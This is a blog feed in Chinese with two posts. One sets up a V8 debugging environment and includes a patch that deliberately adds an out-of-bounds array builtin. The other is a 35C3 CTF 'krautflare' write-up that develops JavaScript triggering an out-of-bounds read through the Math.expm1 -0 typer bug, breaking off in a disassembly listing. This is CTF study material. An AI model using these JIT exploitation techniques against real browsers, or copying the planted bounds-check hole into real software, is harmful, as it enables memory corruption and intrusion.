<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>V8调试环境搭建</title>
      <link href="/2019/10/30/V8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/10/30/V8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>准备写点关于V8的文章，这一篇主要介绍如何搭建环境和推荐一些阅读资料。</p><h3 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h3><ul><li>Ubuntu 18.04.02 x64</li></ul><h3 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h3><p>以下步骤是我从安装完虚拟机开始执行的。</p><ol><li><p>更换源</p><pre><code class="bash">$ sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak$ sudo gedit /etc/apt/sources.list</code></pre><pre><code>deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</code></pre></li><li><p>更新apt</p><pre><code class="shell">$ sudo apt update</code></pre></li><li><p>安装依赖</p><pre><code class="shell">$ sudo apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver pkg-config curl re2c$ sudo ln -s /usr/bin/python2.7 /usr/bin/python</code></pre></li><li><p>设置代理</p><ol><li><p>git代理</p><pre><code class="shell">$ gedit ~/.gitconfig</code></pre><pre><code>[http]    proxy = socks5://ip:1080[https]    proxy = socks5://ip:1080</code></pre></li><li><p>环境变量代理</p><pre><code class="shell">$ gedit ~/.bashrc</code></pre><pre><code class="bash">export http_proxy=http://ip:1080#注意不能使用httpsexport https_proxy=http://ip:1080</code></pre></li><li><p>配置boto代理（gclient不能直接使用socks代理）</p><pre><code class="shell">$ gedit ~/.boto_proxy[Boto]proxy = ipproxy_port = 1080$ echo &quot;export NO_AUTH_BOTO_CONFIG=$HOME/.boto_proxy&quot; &gt;&gt; ~/.bashrc$ source ~/.bashrc</code></pre></li></ol></li><li><p>安装GDB插件</p><pre><code class="shell">$ git clone https://github.com/scwuaptx/peda.git ~/peda$ git clone https://github.com/pwndbg/pwndbg.git ~/pwndbg &amp;&amp; pushd ~/pwndbg &amp;&amp; ~/pwndbg/setup.sh &amp;&amp; popd</code></pre></li><li><p>获取并配置depop_tool</p><pre><code class="bash">$ git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git ~/depot_tools$ echo &quot;export PATH=$PATH:$HOME/depot_tools&quot; &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc</code></pre></li><li><p>获取并配置ninja</p><pre><code class="bash">$ git clone https://github.com/ninja-build/ninja.git ~/ninja$ pushd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; popd$ echo &quot;export PATH=$PATH:$HOME/ninja&quot; &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc</code></pre></li><li><p>增加swap空间</p><p>编译时如果swap空间不够会造成编译失败</p><pre><code class="bash">#查看swap空间free -m #创建swap文件$ sudo mkdir /swap &amp;&amp; cd /swap#这里设定为4个G的大小$ sudo dd if=/dev/zero of=swapfile bs=1024 count=4000000$ sudo mkswap -f swapfile#使文件生效$ sudo swapon swapfile#再次查看就可看到已经扩容成功#将该配置写入/etc/fstab，在文件后面追加内容/swap/swapfile /swap swap defaults 0 0#如果需要卸载swap文件，执行以下命令并删除配置内容就行了#$ sudo swapoff swapfile </code></pre></li></ol><pre><code>9. 获取V8并编译   ```bash   #命令使用过程中很可能会因为环境问题或者网络问题中断，如果中断就将当前目录文件全部删除并重试。   #rm .gclient* &amp;&amp; rm -rf v8   #如果发现不是网络问题请对照上面的配置步骤查看是否环境出了问题（主要看依赖和代理配置）。   $ fetch v8   $ cd v8 &amp;&amp; gclient sync   $ tools/dev/v8gen.py x64.debug   $ ninja -C out.gn/x64.debug</code></pre><ol start="10"><li><p>启动</p><pre><code class="bash">$ ./out/x64.debug/d8 $ ./out/x64.debug/shell </code></pre></li></ol><h3 id="搭建Turbolizer"><a href="#搭建Turbolizer" class="headerlink" title="搭建Turbolizer"></a>搭建Turbolizer</h3><p>Turbolizer是一个基于HTML的分析工具，能够可视化Turbofan pipeline各个阶段优化产生的代码。工具可在<code>v8/tools/turbolizer</code>中找到。</p><p>切换到turbolizer目录之后，搭建步骤：</p><pre><code class="bash">$ npm i #有可能比较慢，如果有cnpm可执行 $ cnpm install$ npm run-script build #sudo cnpm run-script build#也可以部署到其他目录$ npm run deploy -- /www/turbolizer#在当前目录或者是部署的目标目录开启一个http服务，然后去访问就可以使用工具了。$ python -m SimpleHTTPServer 8000</code></pre><p>如果搭建失败可能是因为分支的问题，切换到master分支或者是其他分支再试试。</p><p>部署的时候出现以下输出是正常的：</p><pre><code>$ sudo cnpm run-script build[sudo] password for qwq: &gt; turbolizer@0.1.0 build /home/qwq/Documents/Browser/v8/tools/turbolizer&gt; rollup -csrc/turbo-visualizer.ts → build/turbolizer.js...(!) /home/qwq/Documents/Browser/v8/tools/turbolizer/src/graphmultiview.ts(98,29): semantic error TS2345 Argument of type &#39;GraphView&#39; is not assignable to parameter of type &#39;PhaseView&#39;.  Types of property &#39;detachSelection&#39; are incompatible.    Type &#39;() =&gt; Set&lt;unknown&gt;&#39; is not assignable to type &#39;() =&gt; Set&lt;string&gt;&#39;.      Type &#39;Set&lt;unknown&gt;&#39; is not assignable to type &#39;Set&lt;string&gt;&#39;.        Type &#39;unknown&#39; is not assignable to type &#39;string&#39;.(!) /home/qwq/Documents/Browser/v8/tools/turbolizer/src/graphmultiview.ts(100,29): semantic error TS2345 Argument of type &#39;ScheduleView&#39; is not assignable to parameter of type &#39;PhaseView&#39;.  Types of property &#39;detachSelection&#39; are incompatible.    Type &#39;() =&gt; Set&lt;unknown&gt;&#39; is not assignable to type &#39;() =&gt; Set&lt;string&gt;&#39;.      Type &#39;Set&lt;unknown&gt;&#39; is not assignable to type &#39;Set&lt;string&gt;&#39;.(!) /home/qwq/Documents/Browser/v8/tools/turbolizer/src/graphmultiview.ts(102,29): semantic error TS2345 Argument of type &#39;SequenceView&#39; is not assignable to parameter of type &#39;PhaseView&#39;.  Types of property &#39;detachSelection&#39; are incompatible.    Type &#39;() =&gt; Set&lt;unknown&gt;&#39; is not assignable to type &#39;() =&gt; Set&lt;string&gt;&#39;.      Type &#39;Set&lt;unknown&gt;&#39; is not assignable to type &#39;Set&lt;string&gt;&#39;.(!) /home/qwq/Documents/Browser/v8/tools/turbolizer/src/code-view.ts(176,9): semantic error TS2304 Cannot find name &#39;PR&#39;.(!) /home/qwq/Documents/Browser/v8/tools/turbolizer/src/text-view.ts(149,57): semantic error TS2345 Argument of type &#39;unknown&#39; is not assignable to parameter of type &#39;string&#39;.(!) /home/qwq/Documents/Browser/v8/tools/turbolizer/src/graph-view.ts(371,3): semantic error TS2416 Property &#39;detachSelection&#39; in type &#39;GraphView&#39; is not assignable to the same property in base type &#39;PhaseView&#39;.  Type &#39;() =&gt; Set&lt;unknown&gt;&#39; is not assignable to type &#39;() =&gt; Set&lt;string&gt;&#39;.    Type &#39;Set&lt;unknown&gt;&#39; is not assignable to type &#39;Set&lt;string&gt;&#39;.      Type &#39;unknown&#39; is not assignable to type &#39;string&#39;.(!) /home/qwq/Documents/Browser/v8/tools/turbolizer/src/schedule-view.ts(33,3): semantic error TS2416 Property &#39;detachSelection&#39; in type &#39;ScheduleView&#39; is not assignable to the same property in base type &#39;TextView&#39;.  Type &#39;() =&gt; Set&lt;unknown&gt;&#39; is not assignable to type &#39;() =&gt; Set&lt;string&gt;&#39;.    Type &#39;Set&lt;unknown&gt;&#39; is not assignable to type &#39;Set&lt;string&gt;&#39;.      Type &#39;unknown&#39; is not assignable to type &#39;string&#39;.(!) /home/qwq/Documents/Browser/v8/tools/turbolizer/src/sequence-view.ts(33,3): semantic error TS2416 Property &#39;detachSelection&#39; in type &#39;SequenceView&#39; is not assignable to the same property in base type &#39;TextView&#39;.  Type &#39;() =&gt; Set&lt;unknown&gt;&#39; is not assignable to type &#39;() =&gt; Set&lt;string&gt;&#39;.    Type &#39;Set&lt;unknown&gt;&#39; is not assignable to type &#39;Set&lt;string&gt;&#39;.      Type &#39;unknown&#39; is not assignable to type &#39;string&#39;.(!) Circular dependency: src/edge.ts -&gt; src/node.ts -&gt; src/edge.tscreated build/turbolizer.js in 6.5s</code></pre><p>最好使用Chrome去访问并使用该工具。</p><h3 id="V8的GDB支持"><a href="#V8的GDB支持" class="headerlink" title="V8的GDB支持"></a>V8的GDB支持</h3><p>在tools目录下有两个文件：</p><pre><code>v8/tools/gdbinitv8/tools/gdb-v8-support.py</code></pre><p>只需要在<code>~/.gdbinit</code>中source这两个文件就可以了，需要注意的是这些调试命令只能在debug版本的d8中才会生效，release不行，缺少导出符号。</p><p>关于gdb命令的使用都可以直接查看这两个文件的内容，里面有关于命令的注释。</p><p>另外，开启<code>--allow-natives-syntax</code>时可以使用的native syntax：<a href="https://gist.github.com/totherik/3a4432f26eea1224ceeb" target="_blank" rel="noopener">https://gist.github.com/totherik/3a4432f26eea1224ceeb</a></p><h3 id="Patch-V8"><a href="#Patch-V8" class="headerlink" title="Patch V8"></a>Patch V8</h3><p>假如有如下patch文件内容：</p><pre><code class="DIFF">diff --git a/src/bootstrapper.cc b/src/bootstrapper.ccindex b027d36..ef1002f 100644--- a/src/bootstrapper.cc+++ b/src/bootstrapper.cc@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,                           Builtins::kArrayPrototypeCopyWithin, 2, false);     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,                           Builtins::kArrayPrototypeFill, 1, false);+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,+                          Builtins::kArrayOob,2,false);     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,                           Builtins::kArrayPrototypeFind, 1, false);     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.ccindex 8df340e..9b828ab 100644--- a/src/builtins/builtins-array.cc+++ b/src/builtins/builtins-array.cc@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,   return *final_length; } }  // namespace+BUILTIN(ArrayOob){+    uint32_t len = args.length();+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();+    Handle&lt;JSReceiver&gt; receiver;+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+            isolate, receiver, Object::ToObject(isolate, args.receiver()));+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());+    if(len == 1){+        //read+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));+    }else{+        //write+        Handle&lt;Object&gt; value;+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));+        elements.set(length,value-&gt;Number());+        return ReadOnlyRoots(isolate).undefined_value();+    }+} BUILTIN(ArrayPush) {   HandleScope scope(isolate);diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.hindex 0447230..f113a81 100644--- a/src/builtins/builtins-definitions.h+++ b/src/builtins/builtins-definitions.h@@ -368,6 +368,7 @@ namespace internal {   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \+  CPP(ArrayOob)                                                                \                                                                                \   /* ArrayBuffer */                                                            \   /* ES #sec-arraybuffer-constructor */                                        \diff --git a/src/compiler/typer.cc b/src/compiler/typer.ccindex ed1e4a5..c199e3a 100644--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {       return Type::Receiver();     case Builtins::kArrayUnshift:       return t-&gt;cache_-&gt;kPositiveSafeInteger;+    case Builtins::kArrayOob:+      return Type::Receiver();     // ArrayBuffer functions.     case Builtins::kArrayBufferIsView:</code></pre><p>将patch内容写入文件，比如<code>vuln.patch</code>。</p><p>使用命令进行patch：</p><pre><code class="BASH">$ git apply vuln.patch</code></pre><p>可以用<code>git status</code>查看改动状态：</p><pre><code>$ git statusHEAD detached at 6dc88c191fChanges not staged for commit:  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)    modified:   src/bootstrapper.cc    modified:   src/builtins/builtins-array.cc    modified:   src/builtins/builtins-definitions.h    modified:   src/compiler/typer.ccUntracked files:  (use &quot;git add &lt;file&gt;...&quot; to include in what will be committed)    oob_vuln.patchno changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</code></pre><p>准备编译：</p><pre><code class="bash">#添加选项-f后可以不用commit或者stash$ gclient sync -f#这里使用release是因为这个patch在debug模式会不能生效，使用oob的时候会崩溃，不知道是不是因为我选的分支的问题。$ tools/dev/v8gen.py x64.release$ ninja -C out.gn/x64.release</code></pre><h3 id="Recommended"><a href="#Recommended" class="headerlink" title="Recommended"></a>Recommended</h3><p><a href="http://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">v8 exploit | Sakuraのblog</a></p><p><a href="https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf" target="_blank" rel="noopener">https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf</a></p><p><a href="https://docs.google.com/presentation/d/1H1lLsbclvzyOF3IUR05ZUaZcqDxo7_-8f4yJoxdMooU/edit#slide=id.g18ceb14729_0_221" target="_blank" rel="noopener">An overview of the TurboFan compiler - Google 幻灯片</a></p><p><a href="https://mrale.ph/v8/resources.html" target="_blank" rel="noopener">V8 Resources</a></p><p><a href="https://github.com/danbev/learning-v8/blob/master/README.md" target="_blank" rel="noopener">learning-v8/README.md at master · danbev/learning-v8</a></p><p><a href="https://v8.dev/docs/turbofan" target="_blank" rel="noopener">TurboFan · V8</a></p><p><a href="https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf" target="_blank" rel="noopener">https://www.jfokus.se/jfokus18/preso/Escape-Analysis-in-V8.pdf</a></p><p><a href="https://mrale.ph/blog/2012/06/03/explaining-js-vms-in-js-inline-caches.html" target="_blank" rel="noopener">https://mrale.ph/blog/2012/06/03/explaining-js-vms-in-js-inline-caches.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Browser </tag>
            
            <tag> JavascriptEngine </tag>
            
            <tag> Chrome </tag>
            
            <tag> V8 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>35C3 CTF krautflare exploit</title>
      <link href="/2019/10/30/35C3-CTF-krautflare-exploit/"/>
      <url>/2019/10/30/35C3-CTF-krautflare-exploit/</url>
      
        <content type="html"><![CDATA[<p>这是一个根据v8去年的<code>Math.expm1()</code>的bug改编出来的题目，题目下载地址：<a href="https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar" target="_blank" rel="noopener">https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar</a></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>project zero关于这个bug的描述：<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1710" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1710</a></p><p>造成这个bug的主要原因就是typer将<code>Math.expm1()</code>方法返回的type设置为了<code>Union(PlainNumber, NaN)</code>，这其实就忽略了<code>-0</code>，在V8中，0和-0其实并不完全一样。</p><p>可以用以下代码测试：</p><pre><code class="javascript">d8&gt; Object.is(0, -0)falsed8&gt; </code></pre><p>-0实际上属于浮点数：</p><pre><code class="javascript">d8&gt; %DebugPrint(-0)DebugPrint: -00x282625580561: [Map] - type: HEAP_NUMBER_TYPE - instance size: 16 - elements kind: HOLEY_ELEMENTS - unused property fields: 0 - enum length: invalid - stable_map - back pointer: 0x2826255804d1 &lt;undefined&gt; - prototype_validity cell: 0 - instance descriptors (own) #0: 0x282625580259 &lt;DescriptorArray[0]&gt; - layout descriptor: (nil) - prototype: 0x2826255801d9 &lt;null&gt; - constructor: 0x2826255801d9 &lt;null&gt; - dependent code: 0x2826255802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 00d8&gt; </code></pre><p>这里的<code>HEAP_NUMBER_TYPE</code>在V8中代表的就是浮点数。而<code>PlainNumber</code>在V8中表示除了-0之外的所有浮点数。也就是说typer在处理Math.expm1的时候漏掉了-0。然而实际上执行语句<code>Math.expm1(-0)</code>时会直接返回-0。可以用以下代码验证：</p><pre><code class="javascript">d8&gt; Object.is(Math.expm1(-0), -0)trued8&gt; </code></pre><p>再来看题目给的patch文件<code>revert-bugfix-880207.patch</code>：</p><pre><code class="diff">...--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -1491,6 +1491,7 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {     // Unary math functions.     case BuiltinFunctionId::kMathAbs:     case BuiltinFunctionId::kMathExp:+    case BuiltinFunctionId::kMathExpm1:       return Type::Union(Type::PlainNumber(), Type::NaN(), t-&gt;zone());     case BuiltinFunctionId::kMathAcos:     case BuiltinFunctionId::kMathAcosh:@@ -1500,7 +1501,6 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {     case BuiltinFunctionId::kMathAtanh:     case BuiltinFunctionId::kMathCbrt:     case BuiltinFunctionId::kMathCos:-    case BuiltinFunctionId::kMathExpm1:     case BuiltinFunctionId::kMathFround:     case BuiltinFunctionId::kMathLog:     case BuiltinFunctionId::kMathLog1p:...</code></pre><p>这里的patch给了我们前面提到的bug。同时题目给了一个<code>build.sh</code>，将里面的release替换为debug然后编译，方便调试。</p><h3 id="Trigger"><a href="#Trigger" class="headerlink" title="Trigger"></a>Trigger</h3><p>了解bug之后来尝试触发，根据前面的分析，typer认为Math.expm1只会返回PlainNumber和NaN，那么我们用-0和<code>Math.expm1(x)</code>比较就一直会返回<code>false</code>，当然，要达到这个效果，我们需要需要让JIT编译这段代码：</p><pre><code class="javascript">function foo(x){    let res = Object.is(Math.expm1(x), -0);    return res;}print(&quot;foo(0)  : &quot;+foo(0));%OptimizeFunctionOnNextCall(foo);print(&quot;foo(-0) : &quot;+foo(-0));</code></pre><pre><code>$ ./run.shfoo(0)  : falsefoo(-0) : trueV8 version 7.3.0 (candidate)d8&gt; </code></pre><p>结果明显不符合预期，因为如果触发了bug的话，foo(-0)应该返回false才对。这里就是这道题目和原来bug不一样的地方了，这里可以用Turbolizer跟踪一下优化过程，运行脚本（run.sh）的命令为：</p><pre><code class="bash">/path/to/d8  --shell ./poc.js --allow-natives-syntax --trace-turbo</code></pre><p>生成json文件后用Turbolizer导入：</p><p><img src="https://wx1.sinaimg.cn/mw690/cf584b0ely1g8gemuscuxj20ni0jbjs5.jpg" alt="1566443716450"></p><p>直接看Simplified lowering phase，可以看到Math.expm1被替换为了Float64Expm1，这样的话typer就会对返回的type正常处理，这是我们不想看到的，所以不能让Float64Expm1被调用，于是我们可以在中间调用一个<code>foo(&quot;0&quot;)</code>，这样Turbofan就会搜集到这个信息并反馈，表示<code>foo()</code>还会接受String类型参数，然后调用更底层的<code>Call</code>来进行处理：</p><pre><code class="javascript">function foo(x){    let res = Object.is(Math.expm1(x), -0);    return res;}print(&quot;foo(0)  : &quot;+foo(0));%OptimizeFunctionOnNextCall(foo);print(&quot;foo(-0) : &quot;+foo(-0));foo(&quot;0&quot;);%OptimizeFunctionOnNextCall(foo);print(&quot;foo(0)  : &quot;+foo(0));print(&quot;foo(-0) : &quot;+foo(-0));</code></pre><p>这里使用两次优化的原因是要使用<code>foo(&quot;0&quot;)</code>触发负优化来让Turbofan搜集类型信息。</p><pre><code>$ ./run.shfoo(0)  : falsefoo(-0) : truefoo(0)  : falsefoo(-0) : falseV8 version 7.3.0 (candidate)d8&gt; </code></pre><p>成功返回<code>false</code>，表明typer返回的类型信息成功传递到了之后的优化阶段。</p><p><img src="https://wx3.sinaimg.cn/mw690/cf584b0ely1g8gemusaxhj210o0pptba.jpg" alt="1566444181400"></p><p>在typer lowering phase就可以看到<code>foo()</code>的返回值直接就被替换为了<code>false</code>，成功触发bug。</p><h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>只让foo返回false似乎很难去利用，因为返回值被固定为了false。其实我们就可以利用这一点去触发一个OOB，因为Turbofan认为<code>Object.is(Math.expm1(x), -0)</code>一定返回false，那么我们将它转换成number的话，Turbofan也认为它一定是0（但实际上可能是1），这样的话Turbofan就会在Simple lowering phase去掉CheckBounds node，所以可以构造如下的代码：</p><pre><code class="javascript">function foo(x){    let oob = [1.1, 1.2, 1.3, 1.4];    let idx = Object.is(Math.expm1(x), -0);    idx *= 1337;    return oob[idx];}print(&quot;foo(0)  : &quot;+foo(0));%OptimizeFunctionOnNextCall(foo);foo(&quot;0&quot;);%OptimizeFunctionOnNextCall(foo);print(&quot;foo(0)  : &quot;+foo(0));print(&quot;foo(-0) : &quot;+foo(-0));</code></pre><pre><code class="javascript">$ ./run.shfoo(0)  : 1.1foo(0)  : 1.1foo(-0) : 1.1V8 version 7.3.0 (candidate)d8&gt; </code></pre><p>出现的结果比较奇怪，不管传入0或者-0都返回的是<code>oob[0]</code>的值，这似乎说明idx也被替换为了固定值，还是用Turbolizer看下过程：</p><p><img src="https://wx3.sinaimg.cn/mw690/cf584b0ely1g8gemusdv9j20yx0l5acg.jpg" alt="1566453967115"></p><p>可以看到确实没有了CheckBounds node，但是idx也被替换为了0。</p><p><img src="https://wx3.sinaimg.cn/mw690/cf584b0ely1g8gemusg7cj21820rbwgx.jpg" alt="1566454367693"></p><p>再往前面找可以发现idx被替换为0应该是从typer开始的，因为typer认为idx计算出来的范围一定是<code>Range(0, 0)</code>，所以干脆用固定值替换掉了（替换发生在下一个阶段Type lowering）。</p><p>现在需要寻找一种方法，能让Turbofan不那么早确定idx的值，在Simple lowering phase之前都不触发bug，而在Simple lowering phase的时候才触发，这样才能实现oob。完成这件事就是这个题目最难的部分，可以来看一下Turbofan pipeline：</p><p><img src="https://abiondo.me/assets/img/35c3-krautflare-pipeline.png" alt="Relevant Turbofan pipeline"></p><p>基于让bug迟一点触发的想法，我们可以将<code>Object.is()</code>的两个参数都变成不确定的值，于是可以构造如下代码：</p><pre><code class="javascript">function foo(x, y){    let idx = Object.is(Math.expm1(x), y);    let oob = [1.1, 1.2, 1.3, 1.4];    idx *= 1337;    return oob[idx];}print(&quot;foo(0)  : &quot;+foo(0, -0));%OptimizeFunctionOnNextCall(foo);foo(&quot;0&quot;, -0);%OptimizeFunctionOnNextCall(foo);print(&quot;foo(0)  : &quot;+foo(0, -0));print(&quot;foo(-0) : &quot;+foo(-0, -0));</code></pre><pre><code class="javascript">$ ./run.shfoo(0)  : 1.1foo(0)  : 1.1foo(-0) : undefinedV8 version 7.3.0 (candidate)d8&gt; </code></pre><p>很明显失败了，CheckBounds node没有被去除。</p><p><img src="https://wx4.sinaimg.cn/mw690/cf584b0ely1g8gemurafuj20w10oymzm.jpg" alt="1566456380856"></p><p>Turbofan依然保留了SameValue node，说明<code>Object.is()</code>的返回值在它看来一直都是不确定的。</p><p>前面说到我们需要在Simple lowering phase触发bug才行，而前一个phase就是Escape Analyze，于是我们可以借助Escape Analyze来Reduce SameValue node。可以构造如下代码：</p><pre><code class="javascript">function foo(x){    let aux = {mz:-0};    let idx = Object.is(Math.expm1(x), aux.mz);    let oob = [1.1, 1.2, 1.3, 1.4];    idx *= 1337;    return oob[idx];}print(&quot;foo(0)  : &quot;+foo(0));%OptimizeFunctionOnNextCall(foo);foo(&quot;0&quot;);%OptimizeFunctionOnNextCall(foo);print(&quot;foo(0)  : &quot;+foo(0));print(&quot;foo(-0) : &quot;+foo(-0));</code></pre><p>因为这样的话，我们访问<code>aux.mz</code>实际上Turbofan不确定<code>aux</code>和<code>aux.mz</code>的类型，然后Turbofan去检查<code>aux.mz</code>，发现是-0的固定值，于是在Escape Analyze phase开始的时候就将<code>aux.mz</code>替换为了<code>NumberConstant[-0]</code>。</p><p><img src="https://wx3.sinaimg.cn/mw690/cf584b0ely1g8gemutgfpj211b0rf0uf.jpg" alt="1566457213464"></p><p>通过前面的测试我们知道idx被替换为0发生在typer阶段，而我们通过设置<code>aux.mz</code>使得idx没有被替换，但是<code>aux.mz</code>的类型信息却被Simple lowering phase使用了，并因此去掉了CheckBounds，结果就是：</p><pre><code class="javascript">$ ./run.shfoo(0)  : 1.1foo(0)  : 1.1foo(-0) : -1.1885946300594787e+148V8 version 7.3.0 (candidate)d8&gt;</code></pre><p>Turbofan编译出来的汇编代码如下，SameValue的返回值在0x12f偏移的位置，可以看到并没有被替换，而且没有边界检查：  </p><pre><code class="assembly">kind = OPTIMIZED_FUNCTIONstack_slots = 6compiler = turbofanaddress = 0x7ffe3ab73e58Instructions (size = 596)0x12002a1bf380     0  REX.W leaq rbx,[rip+0xfffffff9]0x12002a1bf387     7  REX.W cmpq rbx,rcx0x12002a1bf38a     a  jz 0x12002a1bf3a4  &lt;+0x24&gt;0x12002a1bf38c     c  REX.W movq rdx,0x36000000000x12002a1bf396    16  REX.W movq r10,0x7f76547f6120  (Abort)    ;; off heap target0x12002a1bf3a0    20  call r100x12002a1bf3a3    23  int3l0x12002a1bf3a4    24  REX.W movq rbx,[rcx-0x20]0x12002a1bf3a8    28  testb [rbx+0xf],0x10x12002a1bf3ac    2c  jnz 0x12002a1039c0  (CompileLazyDeoptimizedCode)    ;; code: Builtin::CompileLazyDeoptimizedCode0x12002a1bf3b2    32  push rbp0x12002a1bf3b3    33  REX.W movq rbp,rsp0x12002a1bf3b6    36  push rsi0x12002a1bf3b7    37  push rdi0x12002a1bf3b8    38  REX.W subq rsp,0x100x12002a1bf3bc    3c  REX.W movq [rbp-0x18],rsi0x12002a1bf3c0    40  REX.W cmpq rsp,[r13+0x11e8] (root (stack_limit))0x12002a1bf3c7    47  jna 0x12002a1bf532  &lt;+0x1b2&gt;0x12002a1bf3cd    4d  REX.W movq rdi,0x8f3c0087239    ;; object: 0x08f3c0087239 &lt;JSFunction expm1 (sfi = 0x4d5a538ff69)&gt;0x12002a1bf3d7    57  REX.W movq rsi,[rdi+0x1f]0x12002a1bf3db    5b  REX.W movq rax,0x8f3c0086b99    ;; object: 0x08f3c0086b99 &lt;Object map = 0x2db35a2012b9&gt;0x12002a1bf3e5    65  push rax0x12002a1bf3e6    66  push [rbp+0x10]0x12002a1bf3e9    69  REX.W movq rdx,[r13-0x28] (root (undefined_value))0x12002a1bf3ed    6d  movl rax,0x10x12002a1bf3f2    72  REX.W movq r10,0x7f7654908d00  (MathExpm1)    ;; off heap target0x12002a1bf3fc    7c  call r100x12002a1bf3ff    7f  REX.W movq rbx,[r13+0x6bf40] (WAAT??? What are we accessing here???)0x12002a1bf406    86  REX.W leaq rdx,[rbx+0x30]0x12002a1bf40a    8a  REX.W cmpq [r13+0x6bf48] (WAAT??? What are we accessing here???),rdx0x12002a1bf411    91  jna 0x12002a1bf55a  &lt;+0x1da&gt;0x12002a1bf417    97  REX.W leaq rdx,[rbx+0x30]0x12002a1bf41b    9b  REX.W movq [r13+0x6bf40] (WAAT??? What are we accessing here???),rdx0x12002a1bf422    a2  REX.W addq rbx,0x10x12002a1bf426    a6  REX.W movq rdx,[r13+0x160] (root (fixed_double_array_map))0x12002a1bf42d    ad  REX.W movq [rbx-0x1],rdx0x12002a1bf431    b1  REX.W movq rdx,0x4000000000x12002a1bf43b    bb  REX.W movq [rbx+0x7],rdx0x12002a1bf43f    bf  REX.W movq r10,0x3ff199999999999a0x12002a1bf449    c9  vmovq xmm0,r100x12002a1bf44e    ce  vmovsd [rbx+0xf],xmm00x12002a1bf453    d3  REX.W movq r10,0x3ff33333333333330x12002a1bf45d    dd  vmovq xmm0,r100x12002a1bf462    e2  vmovsd [rbx+0x17],xmm00x12002a1bf467    e7  REX.W movq r10,0x3ff4cccccccccccd0x12002a1bf471    f1  vmovq xmm0,r100x12002a1bf476    f6  vmovsd [rbx+0x1f],xmm00x12002a1bf47b    fb  REX.W movq r10,0x3ff66666666666660x12002a1bf485   105  vmovq xmm0,r100x12002a1bf48a   10a  vmovsd [rbx+0x27],xmm00x12002a1bf48f   10f  REX.W movq [rbp-0x18],rbx0x12002a1bf493   113  xorl rsi,rsi0x12002a1bf495   115  REX.W movq rdx,rax0x12002a1bf498   118  REX.W movq rax,0x8f3c009ed31    ;; object: 0x08f3c009ed31 &lt;HeapNumber -0&gt;0x12002a1bf4a2   122  REX.W movq r10,0x7f7654914960  